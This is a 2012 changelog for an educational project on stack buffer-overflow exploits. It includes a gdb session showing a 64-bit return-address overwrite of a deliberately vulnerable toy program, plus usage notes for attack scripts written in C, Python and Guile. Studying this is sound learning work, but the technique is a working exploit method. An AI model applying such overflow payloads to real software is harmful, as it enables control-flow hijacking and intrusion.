Shawn the R0ck -- Nov 7 2012

I added Perl version for 64-bit platform. Writing bufferoverflow
exploit is a little bit of different on 64-bit platform. I suggest you
guys ask google about it. Here's my exploit for 64-bit platform:

shawn@shawn-fortress /tmp/SCFE/security/shellcode/overwrite_eip $ gdb victim -q
Reading symbols from /tmp/SCFE/security/shellcode/overwrite_eip/victim...done.
(gdb) disassemble test 
Dump of assembler code for function test:
   0x0000000000400584 <+0>:	push   %rbp
   0x0000000000400585 <+1>:	mov    %rsp,%rbp
   0x0000000000400588 <+4>:	sub    $0x20,%rsp
   0x000000000040058c <+8>:	mov    %rdi,-0x18(%rbp) # See this shit?
   0x0000000000400590 <+12>:	mov    -0x18(%rbp),%rdx
   0x0000000000400594 <+16>:	lea    -0x10(%rbp),%rax
   0x0000000000400598 <+20>:	mov    %rdx,%rsi
   0x000000000040059b <+23>:	mov    %rax,%rdi
   0x000000000040059e <+26>:	callq  0x400460 <strcpy@plt>
   0x00000000004005a3 <+31>:	mov    $0x400710,%eax
   0x00000000004005a8 <+36>:	lea    -0x10(%rbp),%rdx
   0x00000000004005ac <+40>:	mov    %rdx,%rsi
   0x00000000004005af <+43>:	mov    %rax,%rdi
   0x00000000004005b2 <+46>:	mov    $0x0,%eax
   0x00000000004005b7 <+51>:	callq  0x400480 <printf@plt>
   0x00000000004005bc <+56>:	leaveq 
   0x00000000004005bd <+57>:	retq   
End of assembler dump.
(gdb) b *0x000000000040059e
Breakpoint 1 at 0x40059e: file victim.c, line 12.
(gdb) b *0x00000000004005a8
Breakpoint 2 at 0x4005a8: file victim.c, line 13.
(gdb) r `python -c 'print "A" * 24 + "abcd"'` # a=0x61, b=0x62...
Starting program: /tmp/SCFE/security/shellcode/overwrite_eip/victim `python -c 'print "A" * 24 + "abcd"'`
The address of func test(): 0x400584, func fuck_me(): 0x4005be

Breakpoint 1, 0x000000000040059e in test (input=0x7fffffffe97a 'A' <repeats 24 times>, "abcd") at victim.c:12
12	  strcpy(buf, input);
(gdb) p $rbp
$1 = (void *) 0x7fffffffe550
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004005a8 in test (input=0x7fffffffe97a 'A' <repeats 24 times>, "abcd") at victim.c:13
13	  printf("%s \n", buf);
(gdb) p $rbp
$3 = (void *) 0x7fffffffe550
(gdb) x/8x $rbp
0x7fffffffe550:	0x41414141	0x41414141	0x64636261	0x00000000
0x7fffffffe560:	0xffffe658	0x00007fff	0x00000000	0x00000002
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAabcd 

Program received signal SIGSEGV, Segmentation fault.
0x0000000064636261 in ?? ()

This exploit is quite simple to rewritten for 64-bit platform: See the
file attack-x64.pl. For further reading:

http://brundlelab.wordpress.com/2012/04/29/x86-64-exploitation-101-a-comparative-primer/
http://users.suse.com/~krahmer/no-nx.pdf


Shawn the R0ck -- May 16 2012, Beijing

The Guile version works. I will show you how to make it work. In most
ubuntu-like GNU/Linux distributions is not installed the
en_US.ISO-8859-15 at default. So you need to add the one to your
system:

#localedef -c -i en_US -f ISO-8859-15 en_US.ISO-8859-15
#locale-gen

It's a little bit of different implementation from different encoding
format, which the ISO-8859-15 is the byte-string implementation( just
like C programming language) and UNICODE is the character-string
implementation. So if you intend to write your exploit in Guile, the
only thing you need to do is to add a line of code into the 1st line
of source code:

(setlocale LC_ALL "en_US.iso88591")

I reported this bug to NalaGinrut a few days agao. He disscused the
issue with Andy Wingo, and they sent me the solution. They also talked
about the character-string is the future trend in functional language
including python version 3. Thanks to them!

Now we can feel free to write exploit test in Guile.

May L0rd's hacking spirit guide us!!!


Shawn the R0ck -- May 13 2012, Beijing

This is a sample program that can overwrite the EIP register. I wrote
3 programming languages version: C, python and Guile/Scheme. But only
the 1st two are works. I don't know why Guile version have something
wrong with exploit to overwrite the eip register. Fortunately, this is
just a sample code. So only the C code is neccessary.

How to use the code:
#make

C version:
shawn$#./attack
The address of func test(): 0x8048454, func fuck_me(): 0x8048482
AAAAAAAAAABBBBCCCC�� 
being hacked
Segmentation fault

You need to check the fuck_me()'s address. It might be different with
mine. That's only stuff you need to modify in these attack
files(attack.c, attack.py, attack.scm).

python version:
#python attack.py

Guile version:
#guile -l attack.scm

Anyone can help me fix the Guile version? I would really appreciate that.

Happy hacking!

If you need more further reading, download the paper:
http://www.exploit-db.com/download_pdf/17008
